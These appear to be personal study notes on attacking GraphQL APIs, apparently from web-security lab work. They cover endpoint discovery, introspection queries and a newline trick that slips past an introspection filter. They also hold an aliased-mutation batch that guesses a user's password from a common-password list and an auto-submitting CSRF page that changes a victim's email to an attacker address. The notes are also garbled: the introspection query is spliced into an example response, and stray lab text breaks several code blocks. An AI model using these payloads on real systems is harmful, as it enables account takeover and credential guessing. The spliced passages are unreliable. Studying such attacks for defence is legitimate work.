# GraphQL API vulnerabilities
## GraphQL
API that queries spme data from server.  
GraphQL schemas describe the structure of service's data, listing available objects (known as types), fileds, and relationships.  
Data describet by graphql could be manipulated using 3 types of operations:
* Queries fetch data
* Mutations add, change or remove data
* SUbscriptions are similar to queries, but set up a permanent connection by which a server can proactively push data to a client (like a websocket)  
All GraphQL queries use a similar endpoint.
## GraphQL schema
Schema represents a contract between front and backend and represents types (objects) available to user.  
Each object has fileds and arguments and fields could be an another object, scalar, enum, union, interface or custom type.
```
#Example schema definition

    type Product {
        id: ID!
        name: String!
        description: String!
        price: Int
    }
```
`!` shows that a field must not be a NULL  
## GraphQL queries
Queries usually have next components:
* `query` operation type
* query name
* data structure that must be returned
* Optional arguments (to specify query's task)
```
#Example query

    query myGetProductQuery {
        getProduct(id: 123) {
            name
            description
        }
    }

```
## GraphQL mutations
This type of requests specifies what to do with data (add/delete/edit etc)  
Mutations always have some input and have sa,e structure as queries  
```
 #Example mutation request

    mutation {
        createProduct(name: "Flamin' Cocktail Glasses", listed: "yes") {
            id
            name
            listed
        }
    }
```
```
#Example mutation response

    {
        "data": {
            "createProduct": {
                "id": 123,
                "name": "Flamin' Cocktail Glasses",
                "listed": "yes"
            }
        }
    }
```
## Components of queries and mutations
### Fields
```
#Request

    query myGetEmployeeQuery {
        getEmployees {
            id
            name {
                firstname
                lastname
            }
        }
    }
```
In this query we request fields `id`, `name.firstname` and `name.lastname`.
And response is:
```
#Response

    {
        "data": {
            "getEmployees": [
                {
                    "id": 1,
                    "name" {
                        "firstname": "Carlos",
                        "lastname": "Montoya"
                    }
                },
                {
                    "id": 2,
                    "name" {
                        "firstname": "Peter",
                        "lastname": "Wiener"
                    }
                }
            ]
        }
    }
```
### Arguments
```
#Example query with arguments

    query myGetEmployeeQuery {
        getEmployees(id:1) {
            name {
                firstname
                lastname
            }
        }
    }
```
Here we have employee `id:1` as an argument
Potential IDOR  
### Variables
```
 #Example query with variable

    query getEmployeeWithVariable($id: ID!) {
        getEmployees(id:$id) {
            name {
                firstname
                lastname
            }
         }
    }

    Variables:
    {
        "id": 1
    }attacker@exploit-0a9e00b3035a8d718614d4ac01e50083.exploit-server.netr multiple properties:
```
#Valid query using aliases

    query getProductDetails {
        product1: getProduct(id: "1") {
            id
            name
        }
        product2: getProduct(id: "2") {
            id
            name
        }
    }
```
Aliases enable possibility to send multiple GraphQL messages via one HTTP request  

### Fragments
Fragments are pre-defined parts of queries which can be used in multiple queries.  
```
 #Example fragment

    fragment productInfo on Product {
        id
        name
        listed
    }
```
```

    #Query calling the fragment

    query {
        getProduct(id: 1) {
            ...productInfo
            stock
        }
    }
```
```
#Response including fragment fields

    {
        "data": {
            "getProduct": {
                "id": 1,
                "name": "Juice Extracquery       qu  ery Introspecti onQuery {  
    __schema {
        queryType {
            name  
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
         ...FullType
        }
        directives {
            name
            description
            args {
                ...InputValue
        }
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kindschema
        {queryType{name}}}"
    }
```
If this doesn't work, try running the probe over an alternative request method, as introspection may only be disabled over POST. Try a GET request, or a POST request with a content-type
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}tor",
                "listed": "no",
                "stock": 5
            }
        }
    }
```
### Introspection
Built-in GQL funcs that enable you to query a server for information about the schema.  
Info disclosure  
## Finding GQL endpoints
We can send `query{__typename}` to any GQL endpoint and response will include `{"data": {"__typename": "query"}}` because every GQL endpoint has reserved filed `__typename`
### Common endpoint names
* /graphql
* /api
* /api/graphql
* /graphql/api
* /graphql/graphql
We can add `/v1` to the path  
### Request methods
Best practice is only to accept `POST` request with `application/json` Content-Type  
But sometimes GQL endpoints use alternative methods such as `GET` and `x-www-form-urlencoded` Content-Type  
If we can't to detect GQL endpoint with POST request, we can try to send universal query (query{__typename}) with another request methods  

## Initial testing
We must investigate requests and try to change them to detect e.g. IDOR vulns. For example if we see response with sequential ID, we can try to access information, that is not listed on the website:
```
 #Query to get missing product

    query {
        product(id: 3) {
            id
            name
            listed
        }
    }
```
## Discovering schema information
### Introspection
If introspection is enabled, the response returns the names of all available queries.  
```
 #Introspection probe request

{
    "query": "{__schema{queryType{name}}}"
}
```
```
#Full introspection query

    query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }

```
If introspection is enabled but the above query doesn't run, try removing the onOperation, onFragment, and onField directives from the query structure.  
We can use GQL visualizer to make data received from introspection more readable [link](http://nathanrandal.com/graphql-visualizer/)  
### Suggestions
Even if introspection is entirely disabled, you can sometimes use suggestions to glean information on an API's structure.  
Suggestions are a feature of the Apollo GraphQL platform in which the server can suggest query amendments in error messages. These are generally used where a query is slightly incorrect but still recognizable (for example, There is no entry for 'productInfo'. Did you mean 'productInformation' instead?).  
This [tool](https://github.com/nikitastupin/clairvoyance) is helpful to obtain GQL schema  
Also use `InQL` Burp extension  

## Bypassing GQL introspection defences
If you cannot get introspection queries to run for the API you are testing, try inserting a special character after the __schema keyword.  
When developers disable introspection, they could use a regex to exclude the __schema keyword in queries. You should try characters like spaces, new lines and commas, as they are ignored by GraphQL but not by flawed regex.  
```
#Introspection query with newline

    {
        "query": "query{__POST of x-www-form-urlencoded.  
```
 # Introspection probe as GET request

    GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D

```
Full introspection query via GET request bypassing __schema filter:
```
/api?query={__schema%0a{types{name,fields{name,args{name,description,type{name,kind,ofType{name,kind}}}}}}}
```
## Bypassing rate limiting using aliases 
Ordinarily, GraphQL objects can't contain multiple properties with the same name. Aliases enable you to bypass this restriction by explicitly naming the properties you want the API to return. You can use aliases to return multiple instances of the same type of object in one request.  
```
#Request with aliased queries

    query isValidDiscount($code: Int) {
        isvalidDiscount(code:$code){
            valid
        }
        isValidDiscount2:isValidDiscount(code:$code){
            valid
        }
        isValidDiscount3:isValidDiscount(code:$code){
            valid
        }
    }

```
```
mutation login {
    login(input:{username:"carlos",password:"123456"}) {
        token
        success
    }
    login2:login(input:{username:"carlos",password:"password"}) {
        token
        success
    }
    login3:login(input:{username:"carlos",password:"12345678"}) {
        token
        success
    }
    login4:login(input:{username:"carlos",password:"qwerty"}) {
        token
        success
    }
    login5:login(input:{username:"carlos",password:"123456789"}) {
        token
        success
    }
}
```
## GraphQL CSRF 
CSRF vulnerabilities can arise where a GraphQL endpoint does not validate the content type of the requests sent to it and no CSRF tokens are implemented.  
POST requests that use a content type of application/json are secure against forgery as long as the content type is validated. In this case, an attacker wouldn't be able to make the victim's browser send this request even if the victim were to visit a malicious site.  
However, alternative methods such as GET, or any request that has a content type of x-www-form-urlencoded, can be sent by a browser and so may leave users vulnerable to attack if the endpoint accepts these requests. Where this is the case, attackers may be able to craft exploits to send malicious requests to the API.  
Example of CSRF attack that must be delivered to victim:
```
<!DOCTYPE html>
<html>
<head>
  <title>GraphQL CSRF PoC</title>
</head>
<body>
  <form class='login-form' name='email-change-form' action='https://0ae5002d0473912d81e866ed00520053.web-security-academy.net/graphql/v1' method="post">
    <input type='text' name='query' value='mutation{changeEmail(input:{email:"pwned@attacker.com"}){email}}' style="display: none;">
    <button class='button' type='submit' style="display: none;"></button>
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>

```